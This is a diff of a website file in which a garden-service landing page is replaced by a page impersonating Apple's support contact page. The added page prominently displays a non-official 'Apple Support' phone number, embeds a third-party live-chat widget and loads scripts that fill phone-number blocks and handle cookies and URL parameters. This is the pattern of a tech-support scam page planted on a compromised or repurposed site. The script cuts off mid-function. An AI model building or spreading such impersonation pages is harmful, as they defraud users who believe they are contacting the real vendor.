@@ -1,396 +1,379 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
 
-    <!-- Privacy-friendly analytics by Plausible -->
+ 
+ <!-- Privacy-friendly analytics by Plausible -->
 <script async src="https://plausible.io/js/pa-_ha6AsQGpBoFeeaNrPRvy.js"></script>
 <script>
   window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
   plausible.init()
 </script>
 
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GreenThumbGurus | Garden Revival Service</title>
-    <style>
-        :root {
-            --primary-color: #2c5e3b;
-            --secondary-color: #f4ebd9;
-            --accent-color: #d4a373;
-            --text-dark: #333333;
-            --text-light: #fefae0;
-            --bg-color: #fdfaf6;
-        }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
 
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.8;
-            color: var(--text-dark);
-            background-color: var(--bg-color);
-            overflow-x: hidden;
-        }
-
-        /* Animations */
-        @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(40px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-
-        /* Navigation */
-        nav {
-            background-color: var(--primary-color);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        }
-
-        nav ul {
-            list-style-type: none;
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            padding: 1rem;
-        }
-
-        nav ul li {
-            margin: 0 15px;
-        }
-
-        nav ul li a {
-            color: var(--text-light);
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 1.1rem;
-            transition: color 0.3s ease;
-            position: relative;
-        }
-
-        nav ul li a::after {
-            content: '';
-            position: absolute;
-            width: 0;
-            height: 2px;
-            bottom: -5px;
-            left: 0;
-            background-color: var(--accent-color);
-            transition: width 0.3s ease;
-        }
-
-        nav ul li a:hover::after {
-            width: 100%;
-        }
-
-        nav ul li a:hover {
-            color: var(--accent-color);
-        }
-
-        /* No Hero Image - Animated Text Header */
-        header {
-            background: linear-gradient(-45deg, #2c5e3b, #4a7c59, #8bb174, #d4a373);
-            background-size: 400% 400%;
-            animation: gradientShift 15s ease infinite;
-            padding: 6rem 2rem;
-            text-align: center;
-            color: var(--text-light);
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-        }
-
-        header h1 {
-            font-size: 4rem;
-            margin-bottom: 1rem;
-            letter-spacing: 2px;
-            animation: fadeInUp 1s ease-out;
-        }
-
-        header p {
-            font-size: 1.5rem;
-            max-width: 800px;
-            margin: 0 auto;
-            font-weight: 300;
-            animation: fadeInUp 1s ease-out 0.5s backwards;
-        }
-
-        /* Main Layout */
-        main {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 4rem 2rem;
-        }
-
-        .content-section {
-            background: white;
-            padding: 3rem;
-            margin-bottom: 4rem;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
-            animation: fadeInUp 1.2s ease-out;
-            animation-fill-mode: both;
-        }
-        
-        /* Staggered animation classes for content loading */
-        .delay-1 { animation-delay: 0.2s; }
-        .delay-2 { animation-delay: 0.4s; }
-        .delay-3 { animation-delay: 0.6s; }
-        .delay-4 { animation-delay: 0.8s; }
-
-        .content-section h2 {
-            color: var(--primary-color);
-            font-size: 2.5rem;
-            margin-bottom: 1.5rem;
-            border-bottom: 3px solid var(--accent-color);
-            display: inline-block;
-            padding-bottom: 0.5rem;
-        }
-
-        .content-section h3 {
-            color: var(--accent-color);
-            font-size: 1.8rem;
-            margin: 2rem 0 1rem 0;
-        }
-
-        .content-section p {
-            margin-bottom: 1.5rem;
-            font-size: 1.1rem;
-            text-align: justify;
-        }
-
-        /* Image Grid and Animations */
-        .image-gallery {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 2rem;
-            margin: 3rem 0;
-        }
-
-        .image-card {
-            overflow: hidden;
-            border-radius: 12px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            position: relative;
-        }
-
-        .image-card img {
-            width: 100%;
-            height: 300px;
-            object-fit: cover;
-            transition: transform 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-            display: block;
-        }
-
-        .image-card:hover img {
-            transform: scale(1.1) rotate(1deg);
-        }
-
-        .image-card::after {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: linear-gradient(to top, rgba(44, 94, 59, 0.6) 0%, transparent 100%);
-            opacity: 0;
-            transition: opacity 0.4s ease;
-        }
-
-        .image-card:hover::after {
-            opacity: 1;
-        }
-
-        /* Quotations */
-        blockquote {
-            background-color: var(--secondary-color);
-            border-left: 8px solid var(--accent-color);
-            padding: 2rem;
-            font-style: italic;
-            font-size: 1.3rem;
-            margin: 2rem 0;
-            border-radius: 0 8px 8px 0;
-        }
-
-        /* Footer */
-        footer {
-            background-color: #1a3a24;
-            color: var(--text-light);
-            text-align: center;
-            padding: 3rem 2rem;
-            margin-top: 4rem;
-        }
-
-        footer h4 {
-            color: var(--accent-color);
-            font-size: 1.5rem;
-            margin-bottom: 1rem;
-        }
-
-        footer p {
-            margin-bottom: 0.5rem;
-            font-size: 1.1rem;
-        }
-
-        .cta-button {
-            display: inline-block;
-            background-color: var(--accent-color);
-            color: var(--text-dark);
-            padding: 15px 30px;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 1.2rem;
-            border-radius: 50px;
-            margin-top: 2rem;
-            animation: pulse 2s infinite;
-            transition: background-color 0.3s ease;
-        }
-
-        .cta-button:hover {
-            background-color: #f4ebd9;
-            color: var(--primary-color);
-            animation: none;
-        }
-
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            header h1 { font-size: 2.5rem; }
-            header p { font-size: 1.2rem; }
-            .content-section { padding: 2rem; }
-            nav ul { flex-direction: column; align-items: center; }
-            nav ul li { margin-bottom: 10px; }
-        }
-    </style>
 </head>
+
 <body>
-
-    <!-- Navigation -->
-    <nav>
-        <ul>
-            <li><a href="index.html">Home</a></li>
-            <li><a href="privacy.html">Privacy</a></li>
-            <li><a href="disclaimer.html">Disclaimer</a></li>
-            <li><a href="categories.html">Categories</a></li>
-            <li><a href="terms.html">Terms</a></li>
-            <li><a href="cookies.html">Cookies</a></li>
-            <li><a href="contact.html">Contact</a></li>
-        </ul>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
     </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-    <!-- Animated Theme Header (No Hero Image) -->
-    <header>
-        <h1>GreenThumbGurus</h1>
-        <p>Your Premier Garden Revival and Ecological Restoration Experts</p>
-    </header>
-
-    <main>
-        <!-- Section 1: Introduction and Philosophy -->
-        <section class="content-section delay-1">
-            <h2>The Art and Science of Garden Revival</h2>
-            <p>Welcome to GreenThumbGurus, where we believe that every patch of earth has the profound potential to blossom into a thriving, self-sustaining ecosystem. In an era where urbanization frequently eclipses the natural world, our mission is to reclaim, restore, and revive outdoor spaces, transforming them from dormant yards into vibrant, living sanctuaries. Garden revival is not merely about landscaping; it is an intimate conversation with nature, an intricate dance between soil composition, climate adaptation, and horticultural artistry. Our approach marries time-honored organic gardening traditions with cutting-edge ecological science, ensuring that your garden is not only beautiful but resilient against the changing seasons and climate challenges.</p>
-            <p>For many homeowners and property managers, a garden is a source of joy, but over time, due to neglect, incorrect planting, or harsh environmental conditions, these spaces can become overgrown, weed-infested, or simply barren. Soil compaction, nutrient depletion, and the invasion of non-native aggressive species are common ailments that plague modern landscapes. This is where the true essence of our revival service comes into play. We do not just trim hedges and mow lawns; we diagnose the underlying ecological imbalances that are stifling your garden's potential. We look at the microcosm—the fungal networks beneath the soil, the beneficial insect populations, and the drainage patterns—to prescribe a holistic remedy that breathes life back into the land.</p>
-            
-            <h3>Our Core Philosophy: Working With Nature, Not Against It</h3>
-            <p>The traditional landscaping industry has long relied on chemical fertilizers, synthetic pesticides, and a battle-mentality against pests and weeds. At GreenThumbGurus, we fundamentally reject this paradigm. We understand that a garden is a living organism. When you spray chemicals to eradicate a pest, you invariably harm the beneficial predators that would naturally keep that pest in check. Our philosophy is rooted in permaculture principles and regenerative agriculture. We aim to build a robust immune system for your garden. By enriching the soil with organic matter, planting diverse native species that support local wildlife, and employing integrated pest management techniques, we create landscapes that require less maintenance, less water, and zero toxic chemicals over time.</p>
-            <p>Imagine a garden that wakes up in the spring with a symphony of pollinators, where the soil smells rich and earthy, and where the plants display a vibrant vigor that synthetic fertilizers can never truly replicate. This is the GreenThumbGurus promise. We view ourselves as stewards of the earth, tasked with guiding your specific plot of land back to its optimal ecological state. It is a journey of transformation that benefits not only you and your family, who get to enjoy a breathtaking outdoor retreat, but also the broader environment.</p>
-
-            <div class="image-gallery">
-                <div class="image-card">
-                    <img src="https://plus.unsplash.com/premium_photo-1678382345841-eac58a12414e?w=80&w=800" alt="Vintage garden tools resting on soil">
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-833-356-7271 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
                 </div>
-                <div class="image-card">
-                    <img src="https://images.unsplash.com/photo-1557429287-b2e26467fc2b?q=80&w=800" alt="Lush green revitalized lawn">
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
                 </div>
             </div>
         </section>
+    </div>
 
-        <!-- Section 2: Comprehensive Soil Health -->
-        <section class="content-section delay-2">
-            <h2>The Foundation: Deep Soil Remediation</h2>
-            <p>The secret to a magnificent garden does not lie in the petals of its flowers, nor the leaves of its trees; it lies hidden beneath the surface, in the dark, complex world of the soil. Soil is not merely dirt; it is a dynamic, living ecosystem teeming with billions of microorganisms—bacteria, fungi, nematodes, and earthworms—all working in harmony to cycle nutrients and support plant life. At GreenThumbGurus, our revival process always begins here. You cannot build a sturdy house on a crumbling foundation, and you cannot cultivate a resilient garden in lifeless, depleted soil.</p>
-            <p>When we undertake a garden revival project, our first step is a comprehensive soil analysis. We test for macro-nutrients (Nitrogen, Phosphorus, and Potassium), micro-nutrients (like calcium, magnesium, and iron), soil pH levels, and, most importantly, organic matter content. Many suburban lawns and garden beds suffer from severe compaction caused by heavy foot traffic and construction machinery. Compaction squeezes the oxygen out of the soil, making it impossible for roots to penetrate deeply and for water to drain properly. This leads to shallow root systems that are highly vulnerable to drought and disease.</p>
-            
-            <blockquote>"To forget how to dig the earth and to tend the soil is to forget ourselves." - At GreenThumbGurus, we consider soil restoration to be the highest form of ecological art.</blockquote>
-
-            <p>Our soil remediation techniques are tailored to the specific needs of your land. For heavy clay soils that drown roots in winter and bake into concrete in summer, we employ a strategy of deep core aeration followed by top-dressing with rich, mature compost and organic biochar. Biochar, a specialized form of charcoal, acts as a sponge, holding onto water and nutrients while providing a permanent home for beneficial mycorrhizal fungi. These fungi form symbiotic relationships with plant roots, effectively extending the root system and allowing plants to access water and nutrients from far beyond their normal reach.</p>
-            <p>For sandy soils that drain too quickly, stripping plants of hydration and food, we focus on building up humic acids and organic matter. We utilize specialized cover crops, sometimes known as "green manures," such as clover, vetch, or tillage radish. These plants are grown specifically to be chopped and dropped back into the soil, acting as a natural, slow-release fertilizer that dramatically improves soil structure. Furthermore, we brew and apply aerated compost teas—a potent, liquid infusion of beneficial microbes—to inoculate sterile soils and kickstart the biological processes necessary for plant health. By the time our soil remediation phase is complete, your garden beds will be transformed into a nutrient-dense, moisture-retentive, and highly aerated foundation ready to support explosive, healthy growth.</p>
-        </section>
-
-        <!-- Section 3: Native Planting and Ecosystem Integration -->
-        <section class="content-section delay-3">
-            <h2>Horticultural Design and Native Integration</h2>
-            <p>Once the soil has been healed, the canvas is ready for the art of planting. However, at GreenThumbGurus, plant selection goes far beyond aesthetic appeal. While we pride ourselves on creating visually stunning landscapes featuring harmonious color palettes, varied textures, and year-round visual interest, our primary focus is on ecological function. The modern trend of filling gardens with exotic ornamentals from across the globe has led to sterile landscapes that offer no sustenance to local wildlife and require immense amounts of water and chemical intervention to survive in alien climates.</p>
-            <p>We are passionate advocates for the integration of native plants. Native plants have spent thousands of years adapting to the specific climate, rainfall patterns, and soil conditions of your region. Consequently, once established, they are incredibly tough. They possess deep root systems that can weather severe droughts, and they have developed natural defenses against local pests and diseases. By designing a garden around a backbone of native trees, shrubs, and perennials, we drastically reduce the ongoing maintenance burden, saving you time, money, and water resources.</p>
-            <p>But the benefits of native plants extend far beyond simple low-maintenance appeal; they are the cornerstone of a thriving local ecosystem. Native plants co-evolved with native insects, birds, and pollinators. For instance, the majestic Monarch butterfly relies entirely on native milkweed to lay its eggs. Without milkweed, the Monarch cannot survive. By replacing a sterile, non-native lawn with a diverse meadow of native wildflowers, or by integrating native berry-producing shrubs into your borders, your garden instantly becomes a critical sanctuary for biodiversity. You will witness a dramatic increase in the presence of hummingbirds, bees, butterflies, and songbirds.</p>
-            
-            <h3>The Concept of Food Forests and Edible Landscaping</h3>
-            <p>As part of our Garden Revival service, we also specialize in the seamless integration of edible plants into traditional ornamental designs—a practice known as "foodscaping" or creating mini food forests. Why relegate vegetables and fruits to hidden, squared-off plots in the backyard when they can be beautiful additions to your main landscape? Imagine a front yard where structural blueberry bushes provide brilliant fiery-red foliage in the autumn, where climbing runner beans with their striking red flowers scramble up decorative trellises, and where fragrant herbs like rosemary, thyme, and sage serve as drought-tolerant, evergreen groundcovers.</p>
-            <p>Our food forest designs mimic the layered structure of a natural woodland ecosystem. We plant tall canopy fruit trees (like apples or pears), understory trees (like pawpaws or dwarf cherries), productive shrubs (currants, gooseberries), herbaceous perennials (rhubarb, artichokes), and low-lying ground covers (creeping thyme, wild strawberries). This layered approach maximizes the use of vertical space and sunlight, creating an incredibly productive ecosystem that yields fresh, organic food for your family while looking spectacularly beautiful year-round. It is the ultimate expression of a revived garden: one that nourishes both the soul and the body.</p>
-
-            <div class="image-gallery">
-                <div class="image-card">
-                    <img src="https://images.unsplash.com/photo-1641801594669-a99e2807685b?w=80&w=800" alt="Close up of vibrant healthy plants and leaves">
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
                 </div>
-                <div class="image-card">
-                    <img src="https://images.unsplash.com/photo-1584479898061-15742e14f50d?q=80&w=800" alt="Rich dark compost soil in hands">
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
                 </div>
-                <div class="image-card">
-                    <img src="https://images.unsplash.com/photo-1759390304699-5c389476ca80?w=80&w=800" alt="Beautiful stepping stone path through a revived garden">
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
                 </div>
-            </div>
-        </section>
-
-        <!-- Section 4: The Revival Process and Maintenance -->
-        <section class="content-section delay-4">
-            <h2>Our Signature 5-Step Revival Process</h2>
-            <p>Reviving a garden is a meticulous process that requires patience, expertise, and a clear roadmap. We do not believe in quick fixes or superficial makeovers. When you partner with GreenThumbGurus, you are engaging in a comprehensive transformational journey. We have codified our approach into a proven, five-step methodology that guarantees long-lasting results and ecological vibrancy.</p>
-            
-            <h3>Phase 1: The Deep Audit and Consultation</h3>
-            <p>Every revival begins with listening—to you, and to the land. During our initial consultation, we discuss your vision, your lifestyle, and how you wish to interact with your outdoor space. Are you looking for a quiet meditation retreat, a bustling family entertainment area, or a high-yield edible landscape? Simultaneously, our horticulturists conduct a rigorous site audit. We map the microclimates of your property, tracking sun exposure throughout the day, identifying frost pockets, and analyzing wind patterns. We take soil core samples from multiple zones and document existing plant life, identifying invasive species that need removal and mature specimens that can be saved and structurally pruned.</p>
-            
-            <h3>Phase 2: Eradication and Remediation</h3>
-            <p>Before new life can flourish, the old obstacles must be cleared. This phase involves the careful, manual removal of invasive weeds, diseased plant matter, and debris. We strictly avoid broad-spectrum herbicides, utilizing techniques like solarization (using the sun's heat to kill weed seeds), sheet mulching (smothering weeds with cardboard and compost), and targeted manual extraction. Once the slate is clean, we execute the soil remediation strategies detailed earlier—aerating, inoculating, and amending the earth to build a perfect nutritional profile.</p>
-
-            <h3>Phase 3: Structural Pruning and Hardscaping</h3>
-            <p>Many mature gardens suffer because large trees and shrubs have been allowed to grow wildly out of control, blocking light and competing for resources. Our certified arborists perform careful structural and restorative pruning. We thin the canopies to allow dappled sunlight to reach the garden floor, remove dead or crossing branches to promote airflow and prevent disease, and shape the remaining flora to reveal their natural architectural beauty. If the design calls for new pathways, raised beds, or retaining walls, our team constructs these hardscaping elements using sustainably sourced, natural materials that complement the landscape.</p>
-
-            <h3>Phase 4: Planting and Mulching</h3>
-            <p>This is where the magic happens. Guided by our custom master plan, we carefully install the new plant material. We utilize proper planting techniques, ensuring root flares are exposed and planting holes are properly sized, which prevents future root girdling. Immediately after planting, we apply a thick layer of organic, locally sourced mulch. Mulch is critical; it suppresses weed germination, regulates soil temperature, dramatically reduces water evaporation, and slowly breaks down over time to provide a continuous feed of organic matter to the soil web.</p>
-
-            <h3>Phase 5: The Stewardship Handover</h3>
-            <p>A revived garden is a living system that will continue to evolve. We do not just finish the job and walk away. The final phase involves a comprehensive handover session. We provide you with a customized, season-by-season stewardship manual detailing exactly how to care for your new landscape. We cover watering schedules, organic pest management strategies, and seasonal pruning guides. For those who prefer a hands-off approach, GreenThumbGurus offers ongoing, seasonal stewardship programs where our experts return to ensure the garden continues its trajectory toward maturity and ecological balance.</p>
-            
-            <p>Investing in a garden revival is an investment in your home's value, your personal well-being, and the health of the local environment. A well-designed, ecologically sound garden provides a sanctuary from the stress of modern life, offering a quiet space to reconnect with the rhythms of nature. It filters the air, manages stormwater runoff, and provides a crucial habitat for wildlife. It is a legacy of beauty and sustainability that will grow richer and more complex with each passing year.</p>
-            <p>If you look out your window and see a landscape that has lost its vitality, do not despair. The earth is incredibly forgiving, and with the right knowledge, care, and dedication, any space can be resurrected. The journey from a barren yard to a thriving, magical garden is deeply rewarding. Let the experts at GreenThumbGurus guide you every step of the way. Your dream garden is already waiting beneath the surface; it just needs a little help to see the light of day.</p>
-        </section>
-    </main>
-
-    <!-- Footer with Address and Phone Number -->
-    <footer>
-        <h4>GreenThumbGurus - Garden Revival Service</h4>
-        <p>Bringing life, beauty, and ecological balance back to your outdoor spaces.</p>
-        <p><strong>Address:</strong> 142 Nature's Path, Botanical District, Eden Valley, EV 90210</p>
-        <p><strong>Phone:</strong> +1 (555) 867-5309</p>
-        <a href="contact.html" class="cta-button">Start Your Revival Journey Today</a>
+                <meta content="Apple" property="name">
+                <meta content="+1-833-356-7271
+			 " property="telephone">
+            </section>
+        </div>
     </footer>
 
-</body>
-</html>
+
+
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
